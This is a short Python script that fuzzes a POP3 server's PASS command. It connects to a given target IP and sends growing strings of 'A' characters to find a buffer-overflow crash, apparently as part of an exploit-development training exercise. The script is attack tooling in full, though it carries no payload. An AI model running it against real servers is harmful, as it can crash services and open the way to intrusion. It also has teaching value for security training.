#!/usr/bin/env python3

import argparse
import os
import socket


def main():
    parser = argparse.ArgumentParser(description='POP3 PASS buffer fuzzer.')
    parser.add_argument('target', help='target IP address')
    parser.add_argument('-p', '--port', type=int, default=110, help='target port (default: 110)')
    args = parser.parse_args()

    os.system('clear')

    buffer = ['A']
    counter = 100

    while len(buffer) <= 30:
        buffer.append('A' * counter)
        counter = counter + 200

    for string in buffer:
        print(f'\n\nFuzzing PASS with {len(string)} bytes.')

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((args.target, args.port))

        s.recv(1024)
        s.send(b'USER test\r\n')
        s.recv(1024)
        s.send(b'PASS ' + string.encode() + b'\r\n')
        s.send(b'QUIT\r\n')
        s.close()


if __name__ == '__main__':
    main()